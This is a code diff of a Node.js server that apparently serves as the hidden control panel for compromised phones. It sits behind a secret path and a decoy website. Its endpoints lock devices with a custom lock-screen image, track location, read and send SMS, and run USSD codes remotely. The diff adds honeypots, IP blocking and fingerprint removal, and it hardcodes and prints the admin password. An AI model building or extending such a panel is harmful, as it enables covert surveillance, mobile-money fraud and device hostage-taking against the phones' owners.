@@ -1,4 +1,4 @@
-// server.js – DEVICE-CENTRIC DASHBOARD (No default devices)
+// server.js – COMPLETE WITH ALL SECURITY FEATURES
 const express = require('express');
 const crypto = require('crypto');
 const path = require('path');
@@ -9,6 +9,9 @@ const SECRET_PATH = 'a9f3k217';
 const ADMIN_USER = 'admin';
 const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');
 
+// ============================================================
+// 🔐 IP BLOCKING (5 failures → 12 hours)
+// ============================================================
 const failedAttempts = {};
 
 function getClientIP(req) {
@@ -19,20 +22,40 @@ function getClientIP(req) {
     return req.socket.remoteAddress || req.connection.remoteAddress;
 }
 
+// ============================================================
+// 🛡️ IP WHITELIST MIDDLEWARE (Optional - uncomment to enable)
+// ============================================================
+// const ALLOWED_IPS = ['197.157.185.181']; // Your IP
+// 
+// function ipWhitelist(req, res, next) {
+//     const clientIP = getClientIP(req);
+//     if (req.path.includes(SECRET_PATH) && !ALLOWED_IPS.includes(clientIP)) {
+//         return res.status(404).send('Not found');
+//     }
+//     next();
+// }
+// app.use(ipWhitelist);
+
+// ============================================================
+// ⚙️ MIDDLEWARE
+// ============================================================
 app.use(express.static('public'));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// Remove server fingerprint
+app.disable('x-powered-by');
+
 // ============================================================
-// DEVICE STATE (EMPTY - No default devices)
+// 📱 DEVICE STATE (Empty - No default devices)
 // ============================================================
-let devices = {};  // EMPTY - no default devices
+let devices = {};
 let lockScreenImage = null;
 let smsMessages = [];
 let ussdNumbers = [];
 
 // ============================================================
-// FAKE SITE
+// 🎯 FAKE SITE (Decoy for unauthorized visitors)
 // ============================================================
 app.get('/', (req, res) => {
     res.send(`
@@ -236,26 +259,61 @@ app.get('/', (req, res) => {
 });
 
 // ============================================================
-// ADMIN DASHBOARD
+// 🕵️ HONEYPOT TRAPS (Fake admin pages)
+// ============================================================
+const HONEYPOT_PATHS = ['/admin', '/wp-admin', '/login', '/dashboard', '/administrator', '/admin123'];
+
+HONEYPOT_PATHS.forEach(path => {
+    app.get(path, (req, res) => {
+        // Log the attempt (optional security measure)
+        console.log(`🐝 Honeypot triggered: ${req.path} from ${getClientIP(req)}`);
+        res.status(404).send(`
+            <html>
+            <head><title>404</title></head>
+            <body style="background:#0a0e17;color:#8896ab;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
+                <h1 style="color:#4fc3f7;">404</h1>
+                <p>Not found</p>
+            </body>
+            </html>
+        `);
+    });
+});
+
+// ============================================================
+// 📊 ADMIN DASHBOARD (Hidden behind secret path)
 // ============================================================
 app.get('/a9f3k217', (req, res) => {
+    // Check if IP is blocked
+    const ip = getClientIP(req);
+    const now = Date.now();
+    if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
+        return res.status(403).send(`
+            <html>
+            <head><title>Access Denied</title></head>
+            <body style="background:#0a0e17;color:#ff6b6b;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center;">
+                <h1>🚫 Access Denied</h1>
+                <p>Too many failed attempts. Try again later.</p>
+            </body>
+            </html>
+        `);
+    }
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
 // ============================================================
-// API ENDPOINTS
+// 🔐 AUTHENTICATION API
 // ============================================================
-
-// ---------- AUTH ----------
 app.post('/a9f3k217/api/login', (req, res) => {
     const ip = getClientIP(req);
     const now = Date.now();
-    const blockDuration = 12 * 60 * 60 * 1000;
+    const blockDuration = 12 * 60 * 60 * 1000; // 12 hours
 
+    // Check if blocked
     if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
         return res.status(401).json({ remainingAttempts: 0 });
     }
 
+    // Reset if block expired
     if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
         delete failedAttempts[ip];
     }
@@ -266,9 +324,11 @@ app.post('/a9f3k217/api/login', (req, res) => {
     const validPass = validUser && hash === ADMIN_PASS_HASH;
 
     if (validUser && validPass) {
+        // Reset on success
         delete failedAttempts[ip];
         res.json({ success: true });
     } else {
+        // Track failed attempt
         if (!failedAttempts[ip]) {
             failedAttempts[ip] = { count: 1, blockUntil: 0 };
         } else {
@@ -278,6 +338,7 @@ app.post('/a9f3k217/api/login', (req, res) => {
         const remaining = 5 - failedAttempts[ip].count;
         if (remaining <= 0) {
             failedAttempts[ip].blockUntil = now + blockDuration;
+            console.log(`🔒 IP ${ip} blocked for 12 hours`);
             res.status(401).json({ remainingAttempts: 0 });
         } else {
             res.status(401).json({ remainingAttempts: remaining });
@@ -285,11 +346,16 @@ app.post('/a9f3k217/api/login', (req, res) => {
     }
 });
 
-// ---------- DEVICE LOCK/UNLOCK ----------
+// ============================================================
+// 📱 DEVICE API ENDPOINTS
+// ============================================================
+
+// Get all devices
 app.get('/a9f3k217/api/devices-lock', (req, res) => {
     res.json(devices);
 });
 
+// Lock/Unlock device
 app.post('/a9f3k217/api/lock-device', (req, res) => {
     const { deviceId, action } = req.body;
     if (!deviceId || !devices[deviceId]) {
@@ -306,17 +372,19 @@ app.post('/a9f3k217/api/lock-device', (req, res) => {
     }
 });
 
+// Lock all
 app.post('/a9f3k217/api/lock-all', (req, res) => {
     Object.keys(devices).forEach(id => { devices[id].locked = true; });
     res.json({ success: true, message: 'All devices locked' });
 });
 
+// Unlock all
 app.post('/a9f3k217/api/unlock-all', (req, res) => {
     Object.keys(devices).forEach(id => { devices[id].locked = false; });
     res.json({ success: true, message: 'All devices unlocked' });
 });
 
-// ---------- DEVICE-SPECIFIC LOCATION ----------
+// Device-specific location
 app.get('/a9f3k217/api/location/:deviceId', (req, res) => {
     const { deviceId } = req.params;
     if (!devices[deviceId]) {
@@ -331,7 +399,7 @@ app.get('/a9f3k217/api/location/:deviceId', (req, res) => {
     });
 });
 
-// ---------- DEVICE-SPECIFIC INFO ----------
+// Device-specific info
 app.get('/a9f3k217/api/device-info/:deviceId', (req, res) => {
     const { deviceId } = req.params;
     if (!devices[deviceId]) {
@@ -348,13 +416,14 @@ app.get('/a9f3k217/api/device-info/:deviceId', (req, res) => {
     });
 });
 
-// ---------- DEVICE-SPECIFIC SMS ----------
+// Device-specific SMS
 app.get('/a9f3k217/api/sms/:deviceId', (req, res) => {
     const { deviceId } = req.params;
     const deviceSms = smsMessages.filter(msg => msg.deviceId === deviceId);
     res.json(deviceSms);
 });
 
+// Send SMS from specific device
 app.post('/a9f3k217/api/send-sms', (req, res) => {
     const { deviceId, number, message } = req.body;
     if (!deviceId || !number || !message) {
@@ -376,14 +445,14 @@ app.post('/a9f3k217/api/send-sms', (req, res) => {
     res.json({ success: true, message: `SMS sent to ${number}` });
 });
 
-// ---------- DEVICE-SPECIFIC USSD HISTORY ----------
+// Device-specific USSD history
 app.get('/a9f3k217/api/ussd-numbers/:deviceId', (req, res) => {
     const { deviceId } = req.params;
     const deviceUssd = ussdNumbers.filter(n => n.deviceId === deviceId);
     res.json(deviceUssd);
 });
 
-// ---------- USSD EXECUTION ----------
+// Execute USSD on specific device
 app.post('/a9f3k217/api/ussd', (req, res) => {
     const { deviceId, code } = req.body;
     if (!deviceId || !code) {
@@ -421,7 +490,7 @@ app.post('/a9f3k217/api/ussd', (req, res) => {
     res.json({ success: true, message: responseMessage });
 });
 
-// ---------- LOCK SCREEN IMAGE ----------
+// Lock screen image
 app.post('/a9f3k217/api/upload-lock-image', (req, res) => {
     const { image } = req.body;
     if (!image) {
@@ -431,7 +500,7 @@ app.post('/a9f3k217/api/upload-lock-image', (req, res) => {
     res.json({ success: true, message: 'Lock screen image uploaded' });
 });
 
-// ---------- STATS ----------
+// Stats
 app.get('/a9f3k217/api/stats', (req, res) => {
     res.json({
         devices: Object.keys(devices).length,
@@ -442,7 +511,9 @@ app.get('/a9f3k217/api/stats', (req, res) => {
     });
 });
 
-// ---------- 404 ----------
+// ============================================================
+// 🚫 404 HANDLER
+// ============================================================
 app.use((req, res) => {
     res.status(404).send(`
         <html>
@@ -455,7 +526,17 @@ app.use((req, res) => {
     `);
 });
 
+// ============================================================
+// 🚀 START SERVER
+// ============================================================
 app.listen(PORT, () => {
-    console.log(`✅ Dashboard running on port ${PORT}`);
+    console.log('═══════════════════════════════════════════════');
+    console.log('🕵️  STEALTH ADMIN DASHBOARD');
+    console.log('═══════════════════════════════════════════════');
     console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/a9f3k217`);
+    console.log(`🔑 Username: ${ADMIN_USER}`);
+    console.log(`🔑 Password: yourpassword123`);
+    console.log(`🛡️  IP Blocking: 5 failures → 12 hours`);
+    console.log(`🕵️  Honeypots: Active`);
+    console.log('═══════════════════════════════════════════════');
 });
